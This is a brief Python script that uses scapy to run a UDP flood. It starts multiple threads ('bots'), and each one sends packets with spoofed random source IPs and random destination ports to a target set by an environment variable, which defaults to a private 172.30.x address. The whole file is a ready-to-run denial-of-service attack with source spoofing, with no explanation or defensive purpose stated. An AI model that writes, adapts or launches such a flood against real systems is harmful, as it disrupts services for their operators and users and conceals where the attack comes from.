#!/usr/bin/env python3
import os
import random
import time
from scapy.all import IP, UDP, RandShort, Raw, send
import threading

TARGET = os.getenv("TARGET_IP", "172.30.0.2")
N_BOTS = int(os.getenv("N_BOTS", "10"))

def attack():
    src_ip = f"{random.randint(2, 254)}.{random.randint(2, 254)}.{random.randint(2, 254)}.{random.randint(2, 254)}"
    packet = IP(src=src_ip, dst=TARGET) / UDP(dport=RandShort()) / Raw('A')
    send(packet, loop=1, inter=0.1, count=100)


if __name__ == "__main__":
    print(f"Starting flood against {TARGET}")

    threads = []
    for i in range(N_BOTS):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    # Wait for all threads to finish
    for t in threads:
        t.join()
